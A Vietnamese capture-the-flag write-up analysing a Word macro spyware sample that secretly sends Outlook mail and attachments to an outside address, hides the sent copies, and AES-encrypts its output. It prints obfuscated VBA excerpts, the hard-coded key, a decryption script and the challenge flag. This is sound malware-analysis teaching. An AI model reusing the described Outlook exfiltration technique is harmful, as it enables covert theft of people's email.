# one of us-heb-med(phishing / Spear-phishing qua email đính kèm tài liệu Word độc hại (.docm) macro-based spyware / Outlook exfiltration malware)

![image.png](one%20of%20us-heb-med(phishing%20Spear-phishing%20qua%20emai/image.png)

bài này cung cấp cho mình 1 file word và 1 email

qua đề bài ta biết được nó muốn gợi chúng ta đến 

- **Spyware này hoạt động như thế nào?**
- **Email đáng ngờ kia liên quan gì tới spyware?**
- **Kẻ tấn công đã làm gì và đã lấy được gì?**

Tiêu đề mail ghi rất rõ:

**`Outlook Exfiltration Data from User: taustin`**

Nghĩa là:

- đây gần như chắc chắn là **mail exfiltration**
- spyware đã lấy dữ liệu từ **Outlook** của user `taustin`
- rồi tạo/gửi email chứa dữ liệu bị đánh cắp tới `dph@whschool.com`

`mail.txt` nhiều khả năng là **sản phẩm đầu ra của spyware**, đúng như đề mô tả: “suspicious mail that seems to be produced by the spyware”.

tiếp mình dùng olevba để đọc file word

```python
# ➜ one_of_us olevba invisible_shields.docm
olevba 0.60.2 on Python 3.13.7 - http://decalage.info/python/oletools

## FILE: invisible_shields.docm
Type: OpenXML
WARNING For now, VBA stomping cannot be detected for files in memory

VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'

---

Const exfil_address As String = "[dph@whschool.com](mailto:dph@whschool.com)"
Private SiTdrVDFDh       As Boolean
Private lxtmwrylodux((0 + (0 Xor 0)) To ((5 Xor 10) + (11 Xor 59))) As Byte
Private djMloUrgDXwtHC((0 Xor 0) To ((9 Xor 7) + 113)) As Byte
Function FVaFfsygaGuUBB(JulhxRTJAtZ)
Dim atBjGMlxGDau As Variant
Dim IsNslKdUSos As Long
Dim ULDvZWynDzG As String
atBjGMlxGDau = Array(nkalPYSrDkoirG(Array(((1 Xor 3) + 15)), ((0 Xor 7) + (5 Xor 12))), nkalPYSrDkoirG(Array(150), ((4 Xor 13) + (2 Xor 10))), nkalPYSrDkoirG(Array(25), ((2 Xor 0) + 16)), nkalPYSrDkoirG(Array((166 + (33 Xor 101))), (11 Xor 24)), nkalPYSrDkoirG(Array(63), (19 Xor 7)), nkalPYSrDkoirG(Array(((25 Xor 218) + 5)), (18 Xor 7)), nkalPYSrDkoirG(Array((87 + 136)), ((11 Xor 4) + 7)), nkalPYSrDkoirG(Array(((39 Xor 12) + 7)), ((18 Xor 1) + (1 Xor 5))), nkalPYSrDkoirG(Array((73 + 22)), (8 Xor 16)), _
nkalPYSrDkoirG(Array((11 + 55)), 25), _
nkalPYSrDkoirG(Array(((23 Xor 95) + 140)), (15 + (8 Xor 3))), nkalPYSrDkoirG(Array((51 Xor 121)), (11 Xor 16)), nkalPYSrDkoirG(Array(((17 Xor 32) + (32 Xor 20))), 28), nkalPYSrDkoirG(Array((13 Xor 24)), 29), nkalPYSrDkoirG(Array((41 + 0)),
```

ở đây mình chỉ cop 1 phần ra  đoạn này ý chính 

Có 2 nhánh exfil chính:

**1. Exfil nội dung mail**

- Hàm `haPxSQQXjz` kiểm tra **body** và **subject** của từng email xem có chứa từ khóa quan tâm hay không.
- Nếu trúng, nó gọi `ScsSqzpSPu`.
- `ScsSqzpSPu` sẽ **tạo một email mới**, gửi tới `dph@whschool.com`.
- Subject của mail exfil được ghép từ một chuỗi cố định + `Environ(...)`, tức là **gắn username của máy nạn nhân** vào subject. Điều này giải thích vì sao bạn thấy:
    - `Subject: Outlook Exfiltration Data from User: taustin`
- Body không gửi plain text mà đi qua `ydcyecOpBU(...)` để mã hóa trước khi gửi.

**2. Exfil attachment / nguyên email**

- Nếu email có attachment, macro gọi `mvieYItXUPBIvj(...)` để kiểm tra **đuôi file** hoặc **tên file** có đáng quan tâm không.
- Nếu trúng, nó gọi `RkrRzFVxFXd(...)`.
- Hàm này dùng:
    
    ```
    Set XstsppFkvZr = QmmdKXwuMa.Forward
    ```
    
    tức là **forward nguyên email gốc** sang `dph@whschool.com`, nên attachment cũng đi theo luôn.
    

Một chi tiết rất quan trọng: cả hai nhánh đều có:

```
.DeleteAfterSubmit = True
.Send
```

Tức là malware **gửi mail rồi xóa khỏi Sent Items / bản gửi hiển nhiên**, nhằm giảm dấu vết với người dùng. Đây là dấu hiệu rất điển hình của exfil qua Outlook.

Về phần mã hóa của `mail.txt`:

- Hàm `ydcyecOpBU` tạo một chuỗi ngẫu nhiên dài **32 ký tự** bằng `FVaFfsygaGuUBB(32)`.
- Sau đó nó mã hóa dữ liệu bằng một đối tượng crypto kiểu **Rijndael/AES-like ở CBC mode**, với `KeySize = 256` và một IV ngẫu nhiên.
- Kết quả trả về có dạng:

```
[random_32_chars] | [ciphertext đã encode]
```

Điều này khớp rất đẹp với `mail.txt` của bạn:

```
*twGsy*#p7XY8CT4N3RpGq5xDzL7EMHW|F02fGjYTWhdk3JY...
```

Phần trước dấu `|` chính là **IV / nonce-like string 32 ký tự**, còn phần sau là **ciphertext đã được encode**. Nói cách khác, `mail.txt` đúng là **output exfil do spyware tạo ra**, không phải email người dùng tự viết.

Ngoài ra, macro còn cố tình giấu rất nhiều chuỗi bằng:

- `ActiveDocument.Variables("gtrxGyKtbDzUEDng")`
- hàm `nkalPYSrDkoirG(...)`
- base64 decode tùy biến trong `ovLKcDvvuvaxVc(...)`

Nghĩa là tên object như Outlook, MAPI, crypto class, subject template, key, extension list, keyword list... đều bị **obfuscate**, nên `olevba` chỉ cho bạn thấy khung hành vi chứ chưa bung hết chuỗi thật.

tiesp là mình sẽ phải tìm nội dung của `gtrxGyKtbDzUEDng` trong file `.docm`

- Macro dùng:

```
PjJHmvDBocr = ovLKcDvvuvaxVc(ActiveDocument.Variables("gtrxGyKtbDzUEDng"))
```

- Nghĩa là gần như **mọi chuỗi quan trọng** đều đang bị giấu bằng document variable này.

tiếp vì file word thực chất chỉ là những file zip nên mình sẽ giải nén nó ra sau đó mình sẽ tim nội dung cảu gtrxGyKtbDzUEDng trong word/settings.xml

```python
➜  one_of_us unzip invisible_shields.zip
Archive:  invisible_shields.zip
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: word/document.xml
  inflating: word/_rels/document.xml.rels
  inflating: word/vbaProject.bin
 extracting: word/media/image1.png
  inflating: word/theme/theme1.xml
  inflating: word/_rels/vbaProject.bin.rels
  inflating: word/vbaData.xml
  inflating: word/settings.xml
  inflating: customXml/item1.xml
  inflating: customXml/itemProps1.xml
  inflating: word/styles.xml
  inflating: word/webSettings.xml
  inflating: word/fontTable.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml
  inflating: customXml/_rels/item1.xml.rels
➜  one_of_us grep -n 'gtrxGyKtbDzUEDng' word/settings.xml
2:<w:settings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml" xmlns:w16cex="http://schemas.microsoft.com/office/word/2018/wordml/cex" xmlns:w16cid="http://schemas.microsoft.com/office/word/2016/wordml/cid" xmlns:w16="http://schemas.microsoft.com/office/word/2018/wordml" xmlns:w16sdtdh="http://schemas.microsoft.com/office/word/2020/wordml/sdtdatahash" xmlns:w16se="http://schemas.microsoft.com/office/word/2015/wordml/symex" xmlns:sl="http://schemas.openxmlformats.org/schemaLibrary/2006/main" mc:Ignorable="w14 w15 w16se w16cid w16 w16cex w16sdtdh"><w:zoom w:percent="100"/><w:proofState w:spelling="clean" w:grammar="clean"/><w:defaultTabStop w:val="720"/><w:characterSpacingControl w:val="doNotCompress"/><w:compat><w:compatSetting w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="15"/><w:compatSetting w:name="overrideTableStyleFontSizeAndJustification" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="enableOpenTypeFeatures" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="doNotFlipMirrorIndents" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="differentiateMultirowTableHeaders" w:uri="http://schemas.microsoft.com/office/word" w:val="1"/><w:compatSetting w:name="useWord2013TrackBottomHyphenation" w:uri="http://schemas.microsoft.com/office/word" w:val="0"/></w:compat><w:docVars><w:docVar w:name="gtrxGyKtbDzUEDng" w:val="eNS7GlezU9snp3ciGjUJ9HD0eo5arrhaNii/Jgh7Rq38gvvpitv8AHreIuCHDbXhLd1BlLceamykizs8G02DzoP5bZm0PWZkL80S8MfgzZKkTAWqU3oSdton381J023oFIgmK5mEI4c+F85DAOx+mOkrnEbqMaOzJ4EQ4lSM2LfCgqS7AXQDbwipi5KrDBRkfKO8Me3+6MQ5g/XK6b6e2W5HvaCGoWDe6P2crp90G3GTh0kAemmwX1OOhX1IaAeKe8GbBiyp++2WTalzSf1vCviI5a+jcyRw26L8DP6i4urW+YP902QZa43DZ6A+d8Zh438OogAeuuBaNXUgPEgPQpQaca+NDHco7sYPzmI4Fb1XJU9SS1xGw1gU06x8vZ2w6u8oqnQN/xxTvGjxXUV+X9fnxUGQsg64B85ekF+DPeJD/92LHqrK2wVSVYgHGqvwKY/Yshfu9t2fl74o7KDTFATUJa1AHmy9zsNuZPvvwbwG9iD1cHFJLnLemhWN+6vMoQiO/xUIYMWKGQk2D8+RiSvhlptUw2195E3e7K40WnXNLSyAMvW+ngfplr9T23xyapsNo8gz/MOdw0KWMB868kW9kAGQ5IXWPHGaE7H8hWB3t+1K5H861yr7u5BgZIUby3VU0gKV8EH2c0Gl7rCa6sFbiTtCXmV3r1A+Fm3vBMCG19X2YPN62VpHhRMobsfSEl5TezlLWYVA/HNP6G5VX8+sxdTdQOyk84SGtm8I5Ss6kL4bs/+zw/VdcaXr8IZSa5rsmSgRC4+mLHhPSBTZODowjHPJOZK++rnkqLWQTzIRiiRZZVXeSoVEIGSla44WBR7x2xJABJrRzCxKUg+ryslthKXjteBuF9JZZovMADo9uRVgtu7XYVahg9ujIR310KWMMKlr+rzsLAvvlMLPHGVrG8LDoHrbURxqjPlU3a5OppL//jZIRKGTHO353w8HNR/ly3P3Nw=="/></w:docVars><w:rsids><w:rsidRoot w:val="00E06B44"/><w:rsid w:val="00036D4B"/><w:rsid w:val="0078404D"/><w:rsid w:val="00975D64"/><w:rsid w:val="00E06B44"/><w:rsid w:val="00EE1FF3"/></w:rsids><m:mathPr><m:mathFont m:val="Cambria Math"/><m:brkBin m:val="before"/><m:brkBinSub m:val="--"/><m:smallFrac m:val="0"/><m:dispDef/><m:lMargin m:val="0"/><m:rMargin m:val="0"/><m:defJc m:val="centerGroup"/><m:wrapIndent m:val="1440"/><m:intLim m:val="subSup"/><m:naryLim m:val="undOvr"/></m:mathPr><w:themeFontLang w:val="en-US"/><w:clrSchemeMapping w:bg1="light1" w:t1="dark1" w:bg2="light2" w:t2="dark2" w:accent1="accent1" w:accent2="accent2" w:accent3="accent3" w:accent4="accent4" w:accent5="accent5" w:accent6="accent6" w:hyperlink="hyperlink" w:followedHyperlink="followedHyperlink"/><w:shapeDefaults><o:shapedefaults v:ext="edit" spidmax="1026"/><o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout></w:shapeDefaults><w:decimalSymbol w:val="."/><w:listSeparator w:val=","/><w14:docId w14:val="327B9472"/><w15:chartTrackingRefBased/><w15:docId w15:val="{33AF4FBA-A482-4730-8BFE-2446B70127B6}"/></w:settings>
```

Từ macro đã bung ra được mấy thứ quan trọng này:

- key cứng là `8xppg2oX68Bo6koL7hwSeC8bCEWvk540`
- dữ liệu exfil có dạng `random32|ciphertext_base64`
- thuật toán dùng `System.Security.Cryptography.RijndaelManaged`
- `Mode = 1`, tức là CBC trong .NET
- subject exfil đúng là `Outlook Exfiltration Data from User: <username>`

Điểm cần lưu ý là `olevba` đã cảnh báo không loại trừ VBA stomping, nên tên property trong source có thể không phản ánh 100% mã P-code. Nhưng với logic macro hiện tại, giả thuyết mạnh nhất vẫn là: **Rijndael CBC, key 32 byte, IV là chuỗi random 32 ký tự nằm trước dấu `|`**.

giờ mình sẽ lấy phần nội dung chính của emali và lưu ra file blob.txt

```python
cat blob.txt
*twGsy*#p7XY8CT4N3RpGq5xDzL7EMHW|F02fGjYTWhdk3JYn2nntOcU56fnU0YD4prneoaPxbsNIcMgcwsFFGWifg7tNNkohHj9nZRTWJDg/BcnUpTuKynaTtMg9fnOnhjYmg++Q6pklR9Zt0s2vzVu2FMJxO+xBaQrONSPvPg5sd2qRtAkrCa4ikKuKwg38QA7v+wseZRrx37P2sIiellwVcWFMRQCZtlE6bdN14JKmXn+GeXFIP51KHOCR3qd34NgzcGuLySbH9ZGzldLZWagnIcAFKTP9%
```

sau đó mình sẽ dùng code này để decode

```python
import base64
from pathlib import Path
from tlslite.utils.rijndael import Rijndael

key = b"8xppg2oX68Bo6koL7hwSeC8bCEWvk540"
iv, ct = Path("blob.txt").read_text().strip().split("|", 1)
ct = base64.b64decode(ct)
r = Rijndael(key, block_size=32)

out = b""
prev = iv.encode()
for i in range(0, len(ct), 32):
    c = ct[i:i+32]
    out += bytes(x ^ y for x, y in zip(r.decrypt(c), prev))
    prev = c

pad = out[-1]
if 1 <= pad <= 32 and out.endswith(bytes([pad]) * pad):
    out = out[:-pad]

print(out.decode("utf-8", errors="replace"))
```

> 
> 
> 
> (.venv) ➜  one_of_us python3 [1.py](http://1.py/)
> Dear Austin,
> 
> I created an account for you in the forbidden spells server as you wished.
> 
> Your credentials are:
> 
> username: paustin
> password: HTB{th3s3_sp3lls_4r3_t00_d4ng3r0us}
> 
> Sincerely,
> P
> (.venv) ➜  one_of_us
> 

HTB{th3s3_sp3lls_4r3_t00_d4ng3r0us}
